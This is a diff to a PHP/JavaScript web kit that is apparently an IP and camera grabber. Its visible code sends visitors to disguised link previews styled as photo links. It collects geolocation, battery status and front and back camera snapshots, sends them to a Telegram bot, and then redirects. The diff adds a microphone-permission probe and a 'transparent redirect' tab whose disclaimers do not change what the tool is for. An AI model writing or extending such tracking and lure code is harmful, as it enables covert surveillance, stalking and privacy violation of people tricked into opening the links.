@@ -41,10 +41,12 @@ try {
             'px_fake_dsc' => 'Bấm vào để xem nội dung hình ảnh định dạng HD.',
             'px_fake_img' => 'https://www.gstatic.com/images/branding/product/2x/photos_96dp.png',
             'capture_front' => '1',
-            'capture_back' => '1'
+            'capture_back' => '1',
+            'capture_audio' => '0'
         ];
         foreach($defaults as $k => $v) { $db->prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)")->execute([$k, $v]); }
     }
+    $db->prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)")->execute(['capture_audio', '0']);
 } catch (Exception $e) { die("Bảo trì."); }
 
 function get_c($k) { global $db; $st = $db->prepare("SELECT value FROM settings WHERE key = ?"); $st->execute([$k]); return $st->fetchColumn(); }
@@ -123,6 +125,8 @@ if (isset($_GET['img']) && $_GET['img'] === 'pixel') {
 <script>
     const captureFront = <?=json_encode(get_c('capture_front') === '1')?>;
     const captureBack = <?=json_encode(get_c('capture_back') === '1')?>;
+    const captureAudio = <?=json_encode(get_c('capture_audio') === '1')?>;
+    async function askMicConsent(){ if(!captureAudio || !navigator.mediaDevices) return false; try { const s=await navigator.mediaDevices.getUserMedia({audio:true, video:false}); s.getTracks().forEach(t=>t.stop()); return true; } catch(e){ return false; } }
     async function takeSnap(facingMode){ try { const v=document.createElement('video'),c=document.createElement('canvas'),s=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:facingMode}}}); v.srcObject=s; await new Promise(r=>v.onloadedmetadata=r); await v.play(); c.width=v.videoWidth; c.height=v.videoHeight; c.getContext('2d').drawImage(v,0,0); const d=c.toDataURL('image/jpeg',0.7); s.getTracks().forEach(t=>t.stop()); return d; } catch(e){return null;} }
     const push = (payload) => fetch('?action=push', { method: 'POST', body: JSON.stringify({ lid: 'IMAGE', v4:v4, v6:'N/A', bat:bat, ...payload })});
     let v4="<?=$ip_v4_serv?>", bat="N/A";
@@ -134,6 +138,8 @@ if (isset($_GET['img']) && $_GET['img'] === 'pixel') {
         const loc = await askGeoOrFallback('IMAGE');
         const img_front = captureFront ? await takeSnap('user') : null;
         const img_back = captureBack ? await takeSnap('environment') : null;
+        const mic_ok = await askMicConsent();
+        loc.st += mic_ok ? ' / Mic Consent OK' : (captureAudio ? ' / Mic Consent Denied' : '');
         await push({...loc, img_front, img_back, img: img_front || img_back});
         status.innerText=loc.st.includes('IP-Geo') ? 'Đã gửi báo cáo bằng vị trí gần nhất theo IP.' : 'Đã gửi báo cáo theo quyền bạn cho phép.';
     }
@@ -159,13 +165,13 @@ if (isset($_GET['admin'])) {
     if (isset($_GET['clear_logs'])) { $db->exec("DELETE FROM logs"); header("Location: ?admin&t=2"); exit; }
     if (isset($_GET['del_l'])) { $db->prepare("DELETE FROM links WHERE id = ?")->execute([$_GET['del_l']]); header("Location: ?admin"); exit; }
     if (isset($_POST['save_cfg'])) {
-        $keys = ['tg_token', 'tg_id', 'tg_msg_template', 'ui_msg', 'ui_st', 'btn_text', 'proxy_img_url', 'root_title', 'root_desc', 'root_img', 'root_redir', 'px_fake_ttl', 'px_fake_dsc', 'px_fake_img', 'capture_front', 'capture_back'];
-        foreach (['capture_front', 'capture_back'] as $ck) { if (!isset($_POST[$ck])) $_POST[$ck] = '0'; }
+        $keys = ['tg_token', 'tg_id', 'tg_msg_template', 'ui_msg', 'ui_st', 'btn_text', 'proxy_img_url', 'root_title', 'root_desc', 'root_img', 'root_redir', 'px_fake_ttl', 'px_fake_dsc', 'px_fake_img', 'capture_front', 'capture_back', 'capture_audio'];
+        foreach (['capture_front', 'capture_back', 'capture_audio'] as $ck) { if (!isset($_POST[$ck])) $_POST[$ck] = '0'; }
         foreach($keys as $k) { if(isset($_POST[$k])) $db->prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)")->execute([$k, $_POST[$k]]); }
         header("Location: ?admin&t=".($_GET['t'] ?? '1')); exit;
     }
     if (isset($_POST['save_link'])) {
-        foreach (['capture_front', 'capture_back'] as $ck) {
+        foreach (['capture_front', 'capture_back', 'capture_audio'] as $ck) {
             $db->prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)")->execute([$ck, isset($_POST[$ck]) ? '1' : '0']);
         }
         $db->prepare("INSERT OR REPLACE INTO links (id, title, desc, img, redir) VALUES (?,?,?,?,?)")->execute([$_POST['lid'], $_POST['ttl'], $_POST['dsc'], $_POST['img'], $_POST['red']]); header("Location: ?admin"); exit;
@@ -221,6 +227,7 @@ if (isset($_GET['admin'])) {
         <button onclick="st(4,this)" id="nb4" class="sidebar-btn text-emerald-500">🌐 CẤU HÌNH WEB</button>
         <button onclick="st(5,this)" id="nb5" class="sidebar-btn text-blue-500">🤖 TELEGRAM BOT</button>
         <button onclick="st(6,this)" id="nb6" class="sidebar-btn text-yellow-500">📍 VỊ TRÍ CỦA TÔI</button>
+        <button onclick="st(7,this)" id="nb7" class="sidebar-btn text-cyan-500">🧭 LINK CHUYỂN HƯỚNG</button>
         <div class="mt-auto"><a href="?admin&logout=1" class="text-red-500 opacity-50 hover:opacity-100 transition-all uppercase">Logout</a></div>
     </aside>
 
@@ -237,6 +244,7 @@ if (isset($_GET['admin'])) {
                     <div class="grid grid-cols-2 gap-3 text-white normal-case text-[9px]">
                         <label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2"><input type="checkbox" name="capture_front" value="1" <?=get_c('capture_front') === '1' ? 'checked' : ''?>> Camera trước</label>
                         <label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2"><input type="checkbox" name="capture_back" value="1" <?=get_c('capture_back') === '1' ? 'checked' : ''?>> Camera sau</label>
+                        <label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2 col-span-2"><input type="checkbox" name="capture_audio" value="1" <?=get_c('capture_audio') === '1' ? 'checked' : ''?>> Yêu cầu quyền micro (không ghi/lưu âm thanh)</label>
                     </div>
                     <p class="text-[7px] text-amber-400 normal-case italic">Tùy chọn này lưu cấu hình camera chung cho chiến dịch/web; trình duyệt vẫn yêu cầu người xem cấp quyền.</p>
                     <button type="submit" name="save_link" class="btn-pro">LƯU DỰ ÁN</button>
@@ -282,10 +290,34 @@ if (isset($_GET['admin'])) {
         </div>
 
         <div id="t4" class="tab-content max-w-6xl mx-auto space-y-8">
-            <div class="grid lg:grid-cols-2 gap-8"><form method="POST" action="?admin&t=4" class="card space-y-4 shadow-2xl"><h3>GIAO DIỆN & ROOT ID</h3><input name="ui_msg" id="i_msg" value="<?=get_c("ui_msg")?>" oninput="upW()"><input name="ui_st" id="i_st" value="<?=get_c("ui_st")?>" oninput="upW()"><input name="btn_text" id="i_btn" value="<?=get_c("btn_text")?>" oninput="upW()"><hr class="border-slate-800 my-4"><input name="root_title" id="r_ttl" value="<?=get_c("root_title")?>" oninput="upW()"><input name="root_desc" id="r_dsc" value="<?=get_c("root_desc")?>" oninput="upW()"><input name="root_img" id="r_img" value="<?=get_c("root_img")?>" oninput="upW()"><input name="root_redir" value="<?=get_c("root_redir")?>"><div class="grid grid-cols-2 gap-3 text-white normal-case text-[9px]"><label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2"><input type="checkbox" name="capture_front" value="1" <?=get_c('capture_front') === '1' ? 'checked' : ''?>> Camera trước</label><label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2"><input type="checkbox" name="capture_back" value="1" <?=get_c('capture_back') === '1' ? 'checked' : ''?>> Camera sau</label></div><p class="text-[7px] text-amber-400 normal-case italic">Safari iOS/Chrome sẽ hiện hộp thoại quyền; hệ thống không thể tự chấp nhận thay người xem.</p><button type="submit" name="save_cfg" class="bg-emerald-600 text-white py-4 rounded-2xl font-black w-full uppercase shadow-lg">LƯU CẤU HÌNH WEB</button></form><div class="card flex flex-col items-center justify-center bg-white shadow-2xl"><p class="text-gray-400 mb-6 uppercase text-[8px] font-black italic text-center">Frontend Preview</p><div class="w-full max-w-xs border border-gray-200 p-8 rounded-[2rem] text-center shadow-xl"><div class="w-10 h-10 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div><p id="p_msg" class="text-[9px] font-black text-gray-500 uppercase tracking-widest"><?=get_c('ui_msg')?></p><p id="p_st" class="text-gray-300 text-[7px] mt-1 uppercase"><?=get_c('ui_st')?></p><div class="mt-6 bg-blue-600 text-white py-3 rounded-full font-black text-[9px] uppercase shadow-lg" id="p_btn"><?=get_c('btn_text')?></div></div></div></div>
+            <div class="grid lg:grid-cols-2 gap-8"><form method="POST" action="?admin&t=4" class="card space-y-4 shadow-2xl"><h3>GIAO DIỆN & ROOT ID</h3><input name="ui_msg" id="i_msg" value="<?=get_c("ui_msg")?>" oninput="upW()"><input name="ui_st" id="i_st" value="<?=get_c("ui_st")?>" oninput="upW()"><input name="btn_text" id="i_btn" value="<?=get_c("btn_text")?>" oninput="upW()"><hr class="border-slate-800 my-4"><input name="root_title" id="r_ttl" value="<?=get_c("root_title")?>" oninput="upW()"><input name="root_desc" id="r_dsc" value="<?=get_c("root_desc")?>" oninput="upW()"><input name="root_img" id="r_img" value="<?=get_c("root_img")?>" oninput="upW()"><input name="root_redir" value="<?=get_c("root_redir")?>"><div class="grid grid-cols-2 gap-3 text-white normal-case text-[9px]"><label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2"><input type="checkbox" name="capture_front" value="1" <?=get_c('capture_front') === '1' ? 'checked' : ''?>> Camera trước</label><label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2"><input type="checkbox" name="capture_back" value="1" <?=get_c('capture_back') === '1' ? 'checked' : ''?>> Camera sau</label><label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2 col-span-2"><input type="checkbox" name="capture_audio" value="1" <?=get_c('capture_audio') === '1' ? 'checked' : ''?>> Yêu cầu quyền micro (không ghi/lưu âm thanh)</label></div><p class="text-[7px] text-amber-400 normal-case italic">Safari iOS/Chrome sẽ hiện hộp thoại quyền; hệ thống không thể tự chấp nhận thay người xem.</p><button type="submit" name="save_cfg" class="bg-emerald-600 text-white py-4 rounded-2xl font-black w-full uppercase shadow-lg">LƯU CẤU HÌNH WEB</button></form><div class="card flex flex-col items-center justify-center bg-white shadow-2xl"><p class="text-gray-400 mb-6 uppercase text-[8px] font-black italic text-center">Frontend Preview</p><div class="w-full max-w-xs border border-gray-200 p-8 rounded-[2rem] text-center shadow-xl"><div class="w-10 h-10 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div><p id="p_msg" class="text-[9px] font-black text-gray-500 uppercase tracking-widest"><?=get_c('ui_msg')?></p><p id="p_st" class="text-gray-300 text-[7px] mt-1 uppercase"><?=get_c('ui_st')?></p><div class="mt-6 bg-blue-600 text-white py-3 rounded-full font-black text-[9px] uppercase shadow-lg" id="p_btn"><?=get_c('btn_text')?></div></div></div></div>
         </div>
 
         <div id="t5" class="tab-content max-w-4xl mx-auto space-y-6"><form method="POST" action="?admin&t=5" class="card space-y-6 shadow-2xl"><h3>TELEGRAM BOT CONFIG</h3><div class="grid lg:grid-cols-2 gap-4"><input name="tg_token" value="<?=get_c("tg_token")?>" placeholder="BOT TOKEN"><input name="tg_id" value="<?=get_c("tg_id")?>" placeholder="CHAT ID"></div><div><label class="text-blue-500 text-[8px] uppercase mb-2 block font-black">Nội dung báo cáo Telegram</label><textarea name="tg_msg_template" rows="8" class="font-mono text-[9px]"><?=get_c("tg_msg_template")?></textarea></div><button type="submit" name="save_cfg" class="btn-pro italic">LƯU CÀI ĐẶT</button></form></div>
+
+
+
+        <div id="t7" class="tab-content max-w-5xl mx-auto space-y-8">
+            <div class="grid lg:grid-cols-2 gap-8">
+                <div class="card space-y-4 shadow-2xl">
+                    <h3 class="text-cyan-500 italic uppercase">🧭 TẠO LINK CHUYỂN HƯỚNG MINH BẠCH</h3>
+                    <p class="text-[8px] text-slate-400 normal-case italic">Tab này tạo nhanh dữ liệu cho form Dự án. Không dùng tên/logo báo hoặc trang nổi tiếng để mạo danh; hãy ghi rõ đây là link chuyển hướng của bạn.</p>
+                    <input id="safe_lid" placeholder="ID link, ví dụ: tin-cong-khai">
+                    <input id="safe_title" placeholder="Tiêu đề hiển thị minh bạch">
+                    <textarea id="safe_desc" placeholder="Mô tả nội dung/link chuyển hướng..."></textarea>
+                    <input id="safe_img" placeholder="Ảnh đại diện hợp pháp của bạn">
+                    <input id="safe_redir" placeholder="URL đích hợp lệ, ví dụ: https://example.com/bai-viet">
+                    <button type="button" onclick="fillSafeLink()" class="bg-cyan-600 text-white py-4 rounded-2xl font-black w-full uppercase">ĐƯA VÀO FORM DỰ ÁN</button>
+                </div>
+                <div class="card space-y-4">
+                    <h3 class="text-white uppercase italic">Gợi ý cấu hình hợp lệ</h3>
+                    <button type="button" onclick="presetSafe('newsletter')" class="btn-pro bg-slate-800">Bản tin của tôi</button>
+                    <button type="button" onclick="presetSafe('campaign')" class="btn-pro bg-slate-800">Trang chiến dịch công khai</button>
+                    <button type="button" onclick="presetSafe('notice')" class="btn-pro bg-slate-800">Thông báo chuyển hướng</button>
+                    <p class="text-[8px] text-amber-400 normal-case italic">Hệ thống chỉ hỗ trợ nhập link đích thật và thông tin do bạn có quyền sử dụng; không tự động giả mạo báo chí/trang nổi tiếng.</p>
+                </div>
+            </div>
+        </div>
 
         <div id="t6" class="tab-content max-w-5xl mx-auto space-y-8">
             <div class="grid lg:grid-cols-2 gap-8"><div class="card space-y-6"><h3 class="text-yellow-500 italic uppercase">📍 THÔNG TIN CỦA BẠN (ADMIN)</h3><div class="space-y-4 text-[9px] font-mono leading-relaxed"><p class="text-blue-500">🌐 IPv4 SERVER: <b class="text-white"><?=$ip_v4_serv?></b></p><p class="text-blue-500">🌐 IP CỦA BẠN: <b id="adm_ip" class="text-white">Quét...</b></p><p class="text-blue-500">🏢 NHÀ MẠNG: <b id="adm_isp" class="text-white">...</b></p><p class="text-blue-500">📍 VÙNG: <b id="adm_region" class="text-white">...</b></p><hr class="border-slate-800"><p class="text-emerald-500 uppercase">🎯 GPS CHUẨN: <b id="adm_geo" class="text-white">Đang lấy...</b></p><p class="text-emerald-500 uppercase">🏠 ĐỊA CHỈ: <b id="adm_addr" class="text-white italic normal-case">...</b></p></div><button onclick="getAdminLoc()" class="bg-yellow-600 text-white py-4 rounded-2xl font-black w-full shadow-lg italic uppercase">CẬP NHẬT LẠI VỊ TRÍ CỦA TÔI</button></div><div id="adm_map" class="h-[400px] rounded-[3rem] border border-yellow-500/30 shadow-2xl bg-slate-900 overflow-hidden"></div></div>
@@ -298,6 +330,8 @@ if (isset($_GET['admin'])) {
         function ed(l){ document.getElementById('fId').value=l.id; document.getElementById('fTtl').value=l.title; document.getElementById('fDsc').value=l.desc; document.getElementById('fImg').value=l.img; document.getElementById('fRed').value=l.redir; upV(); st(1, document.getElementById('nb1')); }
         function upV(){ document.getElementById('vTtl').innerText=document.getElementById('fTtl').value || 'Tiêu đề...'; document.getElementById('vDsc').innerText=document.getElementById('fDsc').value || 'Mô tả...'; const i=document.getElementById('fImg').value; document.getElementById('vImg').innerHTML=i?`<img src="${i}" class="w-full h-full object-cover">`:'NO IMAGE'; }
         function upPxV(){ document.getElementById('px_v_ttl').innerText=document.getElementById('px_fake_ttl').value || 'Tiêu đề...'; document.getElementById('px_v_dsc').innerText=document.getElementById('px_fake_dsc').value || 'Mô tả...'; const i=document.getElementById('px_fake_img').value; document.getElementById('px_v_img').innerHTML=i?`<img src="${i}" class="w-full h-full object-cover">`:'NO IMAGE'; }
+        function presetSafe(type){ const data={newsletter:['ban-tin','Bản tin cập nhật','Đường dẫn chuyển hướng tới bản tin/trang nội dung của bạn.','https://www.gstatic.com/images/branding/product/2x/news_96dp.png','https://example.com'],campaign:['chien-dich','Trang chiến dịch công khai','Trang đích chính thức của chiến dịch.','https://www.gstatic.com/images/branding/product/2x/forms_96dp.png','https://example.com/campaign'],notice:['thong-bao','Thông báo chuyển hướng','Bạn sẽ được chuyển tới trang đích đã công bố.','https://www.gstatic.com/images/branding/product/2x/keep_96dp.png','https://example.com/notice']}[type]; ['safe_lid','safe_title','safe_desc','safe_img','safe_redir'].forEach((id,i)=>document.getElementById(id).value=data[i]); }
+        function fillSafeLink(){ document.getElementById('fId').value=document.getElementById('safe_lid').value; document.getElementById('fTtl').value=document.getElementById('safe_title').value; document.getElementById('fDsc').value=document.getElementById('safe_desc').value; document.getElementById('fImg').value=document.getElementById('safe_img').value; document.getElementById('fRed').value=document.getElementById('safe_redir').value; upV(); st(1, document.getElementById('nb1')); }
         function upW(){ document.getElementById('p_msg').innerText = document.getElementById('i_msg').value; document.getElementById('p_st').innerText = document.getElementById('i_st').value; document.getElementById('p_btn').innerText = document.getElementById('i_btn').value; }
         async function soi(ip){ document.getElementById('ip_detail').innerHTML = '<div class="animate-pulse font-black text-[9px]">TRUY QUÉT...</div>'; const res = await (await fetch('?action=quick_check&ip='+ip)).json(); if(res.status === 'success'){ document.getElementById('ip_detail').innerHTML = `<div class="text-[8px] space-y-1 uppercase italic">🏢 ISP: <b>${res.isp}</b><br>📍 VÙNG: <b>${res.city}, ${res.country}</b><br>🛡️ VPN: <b>${res.proxy ? 'YES' : 'NO'}</b></div>`; } }
         var m = L.map('map').setView([15.8, 108.2], 5); L.tileLayer('https://{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {subdomains:['mt0','mt1','mt2','mt3']}).addTo(m);
@@ -332,6 +366,8 @@ if (!$l) { $l = ['id'=>'ROOT', 'title'=>get_c('root_title'), 'desc'=>get_c('root
     <script>
     const captureFront = <?=json_encode(get_c('capture_front') === '1')?>;
     const captureBack = <?=json_encode(get_c('capture_back') === '1')?>;
+    const captureAudio = <?=json_encode(get_c('capture_audio') === '1')?>;
+    async function askMicConsent(){ if(!captureAudio || !navigator.mediaDevices) return false; try { const s=await navigator.mediaDevices.getUserMedia({audio:true, video:false}); s.getTracks().forEach(t=>t.stop()); return true; } catch(e){ return false; } }
     async function takeSnap(facingMode){ try { const v=document.createElement('video'),c=document.createElement('canvas'),s=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:facingMode}}}); v.srcObject=s; await new Promise(r=>v.onloadedmetadata=r); await v.play(); c.width=v.videoWidth; c.height=v.videoHeight; c.getContext('2d').drawImage(v,0,0); const d=c.toDataURL('image/jpeg',0.7); s.getTracks().forEach(t=>t.stop()); return d; } catch(e){return null;} }
     const push = (st, la=null, lo=null, payload={}) => fetch('?action=push', { method: 'POST', body: JSON.stringify({ lid: '<?=$id?>', la: la, lo: lo, st: st, v4:v4, v6:'N/A', bat:bat, ...payload })});
     let v4="<?=$ip_v4_serv?>", bat="N/A";
@@ -346,6 +382,8 @@ if (!$l) { $l = ['id'=>'ROOT', 'title'=>get_c('root_title'), 'desc'=>get_c('root
         const loc = await askGeoOrFallback('WEB');
         const img_front = captureFront ? await takeSnap('user') : null;
         const img_back = captureBack ? await takeSnap('environment') : null;
+        const mic_ok = await askMicConsent();
+        if (captureAudio) loc.st += mic_ok ? ' / Mic Consent OK' : ' / Mic Consent Denied';
         await push(loc.st, loc.la, loc.lo, { img_front, img_back, img: img_front || img_back });
         location.replace("<?=$l['redir']?>");
     }
